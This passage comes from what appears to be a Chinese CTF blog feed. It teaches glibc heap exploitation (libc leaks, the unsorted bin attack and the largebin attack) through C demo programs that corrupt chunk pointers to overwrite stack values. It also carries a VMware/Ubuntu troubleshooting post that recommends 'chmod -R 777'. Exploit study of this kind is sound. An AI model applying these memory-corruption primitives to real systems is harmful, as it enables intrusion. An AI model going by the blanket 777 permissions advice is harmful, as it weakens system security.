class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p -- %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>], ptr[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//分别是fd 指针和 bk 指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gdb 中的调试是这样的：</p><p>free 之后的堆结构及内存</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted1.png"></p><p>如果你运行了上面的代码，就会发现 unsorted bin 中只有一个 chunk 时，bin 的 fd 指针和 bk 指针都指向 main_arena 。同样，如果有多个，头部 bin 的 fd 会指向 main_arena 。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted-leak1.png"></p><p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址。以 pwntools 为例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">main_arena_offset = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]</span> + <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h3><p>在 _int_malloc 中由一段与 bk 指针有关的代码，当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;   <span class="hljs-comment">//将 unsorted bin 链表的头指针的 bk字段设置为 bck</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><blockquote><p>unsorted_chunks (av) 用于获取 unsortedbin 双向链表头部的指针</p><p>unsorted_chunks (av) 的两个重要元素：</p><p>fd：bin [0]（指向下一块数据，这里指向 unsorted bin 链表的头部）</p><p>bk：bin [1]（指向前一块数据，这里指向 unsorted bin 链表的尾部）</p></blockquote><p>unsorted bin 从尾部依次往前遍历，由于遍历到一个 chunk 就会进行脱链，所以如果要访问到下一个 chunk，只需要访问 <strong>unsorted_chunks (av)-&gt;bk</strong> 就可以了，而且当 bk 内容为 <strong>unsorted_chunks (av)</strong> 则可以说明全部数据已经被遍历，unsortbin 无内容了。</p><p>代码的后两行在做的就是把 victim 中链表中移除。在这个过程中，就利用 <code>bck-&gt;fd = unsorted_chunks (av);</code> 往上面写了一个 <strong>unsorted_chunks (av) 的地址</strong>，这是一个在 libc 上的地址，由 0x7f 开头，是一个很大的数字。</p><p>也就是说我们如果控制了 bck ，那么就可以在脱链的过程中，往 <strong>victim-&gt;bk-&gt;fd</strong> 写入一个很大的数字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_var = <span class="hljs-number">0</span>;   <span class="hljs-comment">//目标写入的栈</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);   <span class="hljs-comment">//防止与 top chunk 合并</span><br>    <br>    <span class="hljs-built_in">free</span>(p);<br>    p[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);  <span class="hljs-comment">//p 的 bk 指向target_var</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-type">void</span>*)target_var);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体流程如下图</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_bin_attack_order.png"></p><p>初始状态的时候，unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。 </p><p>执行 free(p) ，释放的 chunk 进入 unsortedbin </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb1.png"></p><p>修改 p[1] 之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb2.png"></p><p>再次申请 chunk，就会从 unsortedbin 中取出，此时 unsortedbin 中的结构变成</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb3.png"></p><p>最后结果如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb4.png"></p><h1 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h1><blockquote><p>搞这里的时候头昏昏的，先这么放着，待修改😶‍🌫️</p></blockquote><h3 id="largebin-复习"><a href="#largebin-复习" class="headerlink" title="largebin 复习"></a>largebin 复习</h3><p>大于512（1024）字节的 chunk 称为 large chunk，large bin 就是用于管理这些 large chunk </p><p>被释放进 Large Bin 中的 chunk ，除了和其他的 bin 相同的 prev_size、size、fd、bk 这几个结构之外，还具有 fd_nextsize 和 bk_nextsize :</p><ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li></ul><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适 chunk 时挨个遍历,提高了工作效率。</p><p>排列顺序：</p><ol><li><p>按照大小顺序从小到大排序</p></li><li><p>如果大小相同就按照 free 的先后顺序排序</p></li></ol><p>多个大小相同的堆块，只有首个堆块的 fd_nextsize 和 bk_nextsize 会指向其他堆块，后买你堆块的这两个指针均为0。size 最大的堆块的 bk_nextsize 指向最小的堆块，size 最小的堆块的 fd_nextsize 指向最大的堆块</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);   <span class="hljs-comment">//防止合并，下同</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br><br> <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">free</span>(p3);<br><br> p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;    <span class="hljs-comment">//size 设置为 0x3f1</span><br> p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd 置空</span><br> p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd_nextsize 置空</span><br>p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);  <span class="hljs-comment">//bk 修改为 stack_var1_addr - 0x10</span><br>p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);  <span class="hljs-comment">//bk_nextsize 修改为 stack_var1_addr - 0x20</span><br><br> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>第一轮 malloc 结束，堆结构如下，p1、p2、p3 的地址分别是 0x602000 、 0x602360 、 0x6027a0</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb1.png"></p><p>释放掉 p1 和 p2，两个堆块都进入 unsortedbin 中 ，要注意的是，p1 的大小是 0x330 大小属于 small bin，而 p2 的大小是 0x410 属于 large bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb2.png"></p><p>用 <code>malloc(0x90);</code> 分割堆块，所以原本的堆块被分割，剩余的部分进入了 largebin 。</p><p>实际上详细的流程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>所以会出现下图的堆结构：unsorted bin 中有一个 chunk 大小是 0x330 - 0xa0 &#x3D; 0x290 ；large bin 某一个序列的 bin 中有一个 chunk 大小是 0x410</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb3.png"></p><p>free 掉 p3 ，p3 进入 unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb4.png"></p><p>接下来修改 p2 的信息，修改前后依次如下图</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb5.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb6.png"></p><p>修改后的结果如下：</p><table><thead><tr><th>size</th><th>fd</th><th>bk</th><th>fd_nextsize</th><th>bk_nextsize</th></tr></thead><tbody><tr><td>0x3f1</td><td>0</td><td>stack_var1_addr - 0x10</td><td>0</td><td>stack_var2_addr - 0x20</td></tr></tbody></table><p>我们记这个 stack_var1 - 0x10 为 fakechunk1，此时 stack_var1 - 0x10 的 fd 指针指向 fakechunk1 ，同时 stack_var2 - 0x20 为 fakechunke2 ，此时 stack_var2 - 0x20 的 fd 指针指向 fakechunk2。</p><p>接下来我们再次 <code>malloc(0x90)</code>, p3 挂进了 largebin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb7.png"></p><p>具体有关这个部分的 malloc 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br><br>        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>        <span class="hljs-keyword">if</span> (size == nb)<br>          &#123;<br>            set_inuse_bit_at_offset (victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br><br>        <span class="hljs-comment">/* place chunk in bin */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>          &#123;<br>            victim_index = smallbin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            victim_index = largebin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>              &#123;<br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                  &#123;<br>                    fwd = bck;<br>                    bck = bck-&gt;bk;<br><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                      &#123;<br>                        fwd = fwd-&gt;fd_nextsize;<br>                        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      &#125;<br><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                      <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                      fwd = fwd-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                      &#123;<br>                        victim-&gt;fd_nextsize = fwd;<br>                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                        fwd-&gt;bk_nextsize = victim;<br>                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      &#125;<br>                    bck = fwd-&gt;bk;<br>                  &#125;<br>              &#125;<br>            <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>          &#125;<br><br>        mark_bin (av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>这次我们从 unsortedbin 中拿出的是属于 largebin，所以进入到堆块大小判断的 else 分支，接下来就是指针的操作，由于我们的 p3 被我们修改过数据，就会跳过 while 的循环，进入下面的部分分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>&#123;<br>fwd = fwd-&gt;fd_nextsize;<br>assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br><span class="hljs-comment">/* Always insert in the second position.  */</span><br>fwd = fwd-&gt;fd;<br><span class="hljs-keyword">else</span><br>&#123;<br>victim-&gt;fd_nextsize = fwd;<br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>fwd-&gt;bk_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以在下面的代码中，我们被修改的指针就完成了利用，修改了 stack_var1 和stack_var2 的值。</p><hr><p>觉得堆题还是要去分析一下源码，接下来就计划去看看源码</p><p><del>先做几道题练练手</del></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修师傅修虚拟机系列</title>
    <link href="/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/"/>
    <url>/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>真的建议大家在所有功能都好用的时候存一下快照👻</p><span id="more"></span><h1 id="实现虚拟机和主机之间的拖拽"><a href="#实现虚拟机和主机之间的拖拽" class="headerlink" title="实现虚拟机和主机之间的拖拽"></a>实现虚拟机和主机之间的拖拽</h1><blockquote><p>这个解决方法适合老版本比如16，18。我在互联网上冲浪冲了这么久看到大家都在说22版本不支持拖拽，无所谓了姐麻了</p></blockquote><p>首先需要确保虚拟机的启用拖放和启用复制粘贴选项开启</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_20-12-12.png"></p><h3 id="只能复制粘贴不能拖拽"><a href="#只能复制粘贴不能拖拽" class="headerlink" title="只能复制粘贴不能拖拽"></a>只能复制粘贴不能拖拽</h3><p>虚拟机”启用拖拽”功能已开启，但是从本机往虚拟机拖拽文件时依旧被禁止！</p><p>安装 open-vm-tools-desktop 软件，它是 VMware Tools 其中的一个组件，负责支持虚拟机和主机之间的拖拽。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><h3 id="既不能复制粘贴也不能拖拽"><a href="#既不能复制粘贴也不能拖拽" class="headerlink" title="既不能复制粘贴也不能拖拽"></a>既不能复制粘贴也不能拖拽</h3><p><strong>重装 VMware Tools！</strong></p><p>首先要安装 VMware Tools，如果你是曾经有过VMware Tools 按钮会显示重新安装</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/11.png"></p><p>开机后会发现桌面上或者侧边栏多了一个光盘图标，点进去把压缩包复制到桌面</p><blockquote><p>下图是 Ubuntu22，我的 Ubuntu18 是一个光盘图标直接出现在桌面上</p></blockquote><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-32-05.png"></p><p>直接选中右键 “copy to” </p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-37-20.png"></p><p>在桌面打开 terminal， </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxfv [vmwatr-install-name]<br></code></pre></td></tr></table></figure><p>凡是让你回答 yes 或者 no 的都输入 yes 并回车</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-50-55.png"></p><p>凡是 [&#x2F;…&#x2F;…] 都按回车键</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-51-21.png"></p><p>下图这样就是安装好了</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-54-21.png"></p><h3 id="安装VMware-Tools选项显示灰色"><a href="#安装VMware-Tools选项显示灰色" class="headerlink" title="安装VMware Tools选项显示灰色"></a>安装VMware Tools选项显示灰色</h3><p>只需要以下三个步骤：</p><p>1.关闭虚拟机</p><p>2.在虚拟机设置分别设置<strong>CD&#x2F;DVD、CD&#x2F;DVD2和软盘三个部分</strong>为自动检测（如果你本来就是自动检测，就换成VMware安装目录中的 linux.iso）</p><p>3.再重启虚拟机，灰色字即点亮</p><blockquote><p>注意！如果开机以后还是不行，就重启，趁着屏幕是黑色的还没出现登录界面的时候再次查看，你就会发现它亮了🤗</p><p>快准狠！点击重新安装！！！</p></blockquote><h3 id="另辟新道路"><a href="#另辟新道路" class="headerlink" title="另辟新道路"></a>另辟新道路</h3><p>不就是想在主机和虚拟机之间共享文件嘛，直接打开浏览器登陆微信文件传输助手传输文件</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_17-32-09.png"></p><h1 id="没有网络图标"><a href="#没有网络图标" class="headerlink" title="没有网络图标"></a>没有网络图标</h1><p>没有网络图标也连不上网辣！🤔</p><p>关闭网络服务再删除文件，最后重新启动服务。在terminal中输入以下三条命令即可恢复</p><p>重启可以解决百分之九十九的问题🤤</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">sudo service NetworkManager stop <br> <br>sudo rm /var/lib/NetworkManager/NetworkManager.<span class="hljs-keyword">state</span> <br> <br>sudo service NetworkManager start<br></code></pre></td></tr></table></figure><blockquote><p>NetworkManager 是 22版本 对应的名称，不同版本的不一样但我也不太清楚，请自行百度</p></blockquote><h1 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h1><p>在执行文件时，你是否会遇到 <code>bash: ./pwn: Permission denied</code> 这种情况呢？</p><p>那是因为没有正确设置读取权限，我们只需要将想要用户执行读写权限的位置填入下方 <code>[]</code> 中，再复制到 terminal 中就可以解决问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> -R 777 [~/Desktop]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>VMware Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#14 Basic WP</title>
    <link href="/2023/08/04/NSSCTF-Round-14-Basic-WP/"/>
    <url>/2023/08/04/NSSCTF-Round-14-Basic-WP/</url>
    
